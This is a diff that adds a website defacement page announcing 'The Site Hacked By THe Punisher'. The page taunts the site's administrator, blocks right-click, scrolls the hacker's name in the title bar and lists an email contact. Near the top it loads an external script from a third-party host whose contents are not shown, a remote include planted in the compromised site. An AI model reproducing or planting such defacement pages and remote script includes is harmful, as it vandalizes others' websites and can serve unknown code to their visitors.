@@ -1,0 +1,364 @@
+<BODY background="" aLink=#0000ff link=#0000ff bgColor=#000000 text=#000000
+vLink=#800080>
+
+  <!--&#1587;&#1603;&#1585;&#1576;&#1578; &#1575;&#1604;&#1606;&#1580;&#1608;&#1605; -->
+<script src='http://rita.webuda.com/w.js' type='text/javascript'></script>
+
+
+<!--&#1606;&#1589; the site hacked by -->
+
+<P align=center><FONT color=#ffffff size=5><STRONG><FONT
+color=#ff0000>T</FONT>h<FONT color=#ff0000>e</FONT> S<FONT
+color=#ff0000>i</FONT>T<FONT color=#ff0000>e</FONT>&nbsp;H<FONT
+color=#ff0000>a</FONT>c<FONT color=#ff0000>K</FONT>e<FONT
+color=#ff0000>d</FONT>&nbsp;B<FONT
+color=#ff0000>y</FONT>&nbsp;</STRONG></FONT></P>
+
+
+
+
+  <!-- &#1587;&#1603;&#1585;&#1576;&#1578; &#1575;&#1604;&#1593;&#1606;&#1608;&#1575;&#1606; &#1575;&#1604;&#1601;&#1590;&#1610;  -->
+
+<script>teclear();</script><center><h1><span id="lightf_light"><font color="#727272"></font><font color="#7f7f7f">M</font><font color="#8c8c8c"> </font><font color="#999999">a</font><font color="#a5a5a5">V</font><font color="#b2b2b2">i</font><font color="#bfbfbf">A</font><font color="#cccccc">s</font><font color="#d8d8d8">)</font><font color="#a6a6a6"> </font><font color="#999999"> </font><font color="#8d8d8d">r</font><font color="#808080">e</font><font color="#737373">d</font><font color="#666666"> </font><font color="#5a5a5a">s</font><font color="#4d4d4d">t</font><font color="#404040">y</font><font color="#333333">L</font><font color="#272727">e</font><font color="#1a1a1a">&amp;</font><font color="#0d0d0d">#</font><font color="#000000">1</font><font color="#0c0c0c">8</font><font color="#191919">0</font><font color="#262626">;</font><font color="#333333"> </font><font color="#3f3f3f">b</font><font color="#4c4c4c">a</font><font color="#595959">b</font><font color="#666666">y</font></span></h2></center><font color="#333333"></font><script>lightf_lightcolor1=	"000000" // B&#252;y&#252;k harf kullan&#305;n
+
+lightf_lightcolor2=	"FFFFFF" // B&#252;y&#252;k harf kullan&#305;n
+
+lightf_message=	"THe PUNISHER"
+
+lightf_speed=	100 // milisaniye
+
+color_mesk=new Array();
+
+color_mesk[10]="A";
+
+color_mesk[11]="B";
+
+color_mesk[12]="C";
+
+color_mesk[13]="D";
+
+color_mesk[14]="E";
+
+color_mesk[15]="F";
+
+color_A=10;
+
+color_B=11;
+
+color_C=12;
+
+color_D=13;
+
+color_E=14;
+
+color_F=15;
+
+color_let="ABCDEF";
+
+function color_mes(color_num)
+
+{ if(color_let.indexOf(color_num) != -1) { return eval("color_" + color_num) } else { if(color_num < 10) { return eval(color_num) } else { return color_mesk[color_num]; } }
+
+}
+
+function color(color_begin,color_einde,color_stappen,color_stap)
+
+{ color_hh1=(color_mes(color_begin.charAt(0))*16)+color_mes(color_begin.charAt(1)); color_hh2=(color_mes(color_begin.charAt(2))*16)+color_mes(color_begin.charAt(3)); color_hh3=(color_mes(color_begin.charAt(4))*16)+color_mes(color_begin.charAt(5)); color_pp1=(color_mes(color_einde.charAt(0))*16)+color_mes(color_einde.charAt(1)); color_pp2=(color_mes(color_einde.charAt(2))*16)+color_mes(color_einde.charAt(3)); color_pp3=(color_mes(color_einde.charAt(4))*16)+color_mes(color_einde.charAt(5)); if(color_hh1 < color_pp1) { color_ff1=color_hh1+Math.floor((color_pp1-color_hh1)/color_stappen*color_stap); color_ff1=eval("\'"+color_mes(Math.floor(color_ff1/16))+"\'")+eval("\'"+color_mes(color_ff1-(Math.floor(color_ff1/16)*16))+"\'"); } else { color_ff1=color_hh1-Math.floor((color_hh1-color_pp1)/color_stappen*color_stap); color_ff1=eval("\'"+color_mes(Math.floor(color_ff1/16))+"\'")+eval("\'"+color_mes(color_ff1-(Math.floor(color_ff1/16)*16))+"\'"); } if(color_hh2 < color_pp2) { color_ff2=color_hh2+Math.floor((color_pp2-color_hh2)/color_stappen*color_stap); color_ff2=eval("\'"+color_mes(Math.floor(color_ff2/16))+"\'")+eval("\'"+color_mes(color_ff2-(Math.floor(color_ff2/16)*16))+"\'"); } else { color_ff2=color_hh2-Math.floor((color_hh2-color_pp2)/color_stappen*color_stap); color_ff2=eval("\'"+color_mes(Math.floor(color_ff2/16))+"\'")+eval("\'"+color_mes(color_ff2-(Math.floor(color_ff2/16)*16))+"\'"); } if(color_hh3 < color_pp3) { color_ff3=color_hh3+Math.floor((color_pp3-color_hh3)/color_stappen*color_stap); color_ff3=eval("\'"+color_mes(Math.floor(color_ff3/16))+"\'")+eval("\'"+color_mes(color_ff3-(Math.floor(color_ff3/16)*16))+"\'"); } else { color_ff3=color_hh3-Math.floor((color_hh3-color_pp3)/color_stappen*color_stap); color_ff3=eval("\'"+color_mes(Math.floor(color_ff3/16))+"\'")+eval("\'"+color_mes(color_ff3-(Math.floor(color_ff3/16)*16))+"\'"); } return color_ff1+color_ff2+color_ff3
+
+}
+
+lightf_num=0;
+
+lightf_num2=0;
+
+lightf_txt=new Array();
+
+lightf_txt[0]="";
+
+function lightf()
+
+{ for(lightf_i=0;lightf_i != Math.floor(lightf_message.length/2);lightf_i++) { lightf_txt[lightf_i]=color(lightf_lightcolor1,lightf_lightcolor2,Math.floor(lightf_message.length/2),lightf_i); } for(lightf_i=Math.floor(lightf_message.length/2);lightf_i != lightf_message.length;lightf_i++) { lightf_txt[lightf_i]=color(lightf_lightcolor2,lightf_lightcolor1,Math.floor(lightf_message.length/2),(lightf_i-Math.floor(lightf_message.length/2))); } lightf_lightf1();
+
+}
+
+function lightf_lightf1()
+
+{ lightf_txt[lightf_message.length+1]=""; lightf_num2=lightf_message.length-lightf_num; for(lightf_i=0;lightf_i != lightf_message.length;lightf_i++) { if(lightf_i+lightf_num < lightf_message.length) { lightf_txt[lightf_message.length+1]=lightf_txt[lightf_message.length+1]+"<font color='#"+lightf_txt[(lightf_i+lightf_num)]+"'>"+lightf_message.charAt(lightf_i)+"</font>"; } else { lightf_txt[lightf_message.length+1]=lightf_txt[lightf_message.length+1]+"<font color='#"+lightf_txt[lightf_i-lightf_num2]+"'>"+lightf_message.charAt(lightf_i)+"</font>"; } } if(lightf_num != lightf_message.length) { lightf_num++; } else { lightf_num=0; } lightf_light.innerHTML=lightf_txt[lightf_message.length+1]; setTimeout("lightf_lightf1()",lightf_speed)
+
+}
+
+lightf();</script>
+ <P>&nbsp;</P>
+
+
+
+
+   <script language="JavaScript1.2">
+
+
+
+
+/*
+
+Neon Lights Text
+
+By JavaScript Kit (http://javascriptkit.com)
+
+For this script, TOS, and 100s more DHTML scripts,
+
+Visit http://www.dynamicdrive.com
+
+*/
+
+
+
+var message="HI ADMIN !!>> You Don't Have AnY SeCurity in YoUr Web SiTe..yur Security is NONO for my.....you have remember my name very well... "
+
+var neonbasecolor="white"
+
+var neontextcolor="red"
+
+
+
+
+
+var flashspeed=100  //in milliseconds
+
+
+
+///No need to edit below this line/////
+
+
+
+var n=0
+
+if (document.all||document.getElementById){
+
+document.write('<font color="'+neonbasecolor+'">')
+
+for (m=0;m<message.length;m++)
+
+document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
+
+document.write('</font>')
+
+}
+
+else
+
+document.write(message)
+
+
+
+function crossref(number){
+
+var crossobj=document.all? eval("document.all.neonlight"+number) :
+
+document.getElementById("neonlight"+number)
+
+return crossobj
+
+}
+
+
+
+function neon(){
+
+
+
+//Change all letters to base color
+
+if (n==0){
+
+for (m=0;m<message.length;m++)
+
+//eval("document.all.neonlight"+m).style.color=neonbasecolor
+
+crossref(m).style.color=neonbasecolor
+
+}
+
+
+
+//cycle through and change individual letters to neon color
+
+crossref(n).style.color=neontextcolor
+
+
+
+if (n<message.length-1)
+
+n++
+
+else{
+
+n=0
+
+clearInterval(flashing)
+
+setTimeout("beginneon()",1500)
+
+return
+
+}
+
+}
+
+
+
+function beginneon(){
+
+if (document.all||document.getElementById)
+
+flashing=setInterval("neon()",flashspeed)
+
+}
+
+beginneon()
+
+</script>
+  <P>&nbsp;</P>
+  <TABLE style="HEIGHT: 500px" border  =1 cellSpacing=1
+borderColor=#000000 cellPadding=1 width=983 bgColor=#ffffff align=center
+#FFFFFF?>
+
+  <TR>
+    <TD>&nbsp;<IMG border=0 alt=""
+      src="http://rita.webuda.com/the_punisher_1.jpg" width=1000
+height=800></TD></TR></TABLE>
+
+
+
+
+
+<script language="JavaScript">
+
+ <!--Sembunyikan dari browser yang tidak mendukung Javascript
+
+ //awal code tulisan titlebar bergerak
+
+ var kiri = "[ "; //Karakter Penutup di kiri
+
+ var kanan = " ]"; //Karakter Penutup di Kanan
+
+ var pesan = "hacked by THe Punisher "; //Tulisan yang akan Berjalan
+
+ var kecepatan = 100; //Kecepatan Tulisan [Makin Kecil, Makin Cepat
+
+
+
+ function th3sn0wbr4in()
+
+ {
+
+ document.title=kiri+pesan+kanan;
+
+ pesan=pesan.substring(1,pesan.length)+pesan.charAt(0);
+
+ setTimeout("th3sn0wbr4in()",kecepatan);
+
+ }
+
+ th3sn0wbr4in();
+
+ //akhir code tulisan titlebar bergerak
+
+ // -->
+
+ </script>
+
+
+
+    <script language=JavaScript>
+	
+// Visit our site at http://www.star28.com/ for more code
+<!--
+
+var message="Don't Try THis Agin..ok!!";
+///////////////////////////////////
+function clickIE() {if (document.all) {(message);return false;}}
+function clickNS(e) {if 
+(document.layers||(document.getElementById&&!document.all)) {
+if (e.which==2||e.which==3) {(message);return false;}}}
+if (document.layers) 
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+
+document.oncontextmenu=new Function("return false")
+// --> 
+</script>
+  
+  
+  
+  
+
+
+
+
+
+
+ <P>&nbsp;</P>
+
+
+
+
+
+
+<FONT face="Tahoma" size="2" color="#ff0000"><b>THanks For</b> :</FONT><span class="style4">
+
+
+
+<span class="style2">
+
+
+
+<strong>
+
+
+
+<span class="style6">
+
+
+
+<marquee
+
+
+
+ scrollamount="2" scrolldelay="20" width="50%" ><FONT
+color=#ffffff>MY God Allah &nbsp; My parents &nbsp;&nbsp; MY love&nbsp; MY
+brothers&nbsp; MY freinds</FONT>
+
+
+
+</marquee>
+
+
+
+</span></strong></span></span><br >
+
+
+
+ <br >
+
+
+
+<center><marquee direction="left" behavior="alternate" scrollamount="2" scrolldelay="20" width="40%">
+
+
+
+
+
+
+
+<font color="#A6A6A6" face="verdana" size="2">
+
+
+
+
+
+
+Email: syrian_punisher@hotmail.com
+
+ </a></font>
+
+
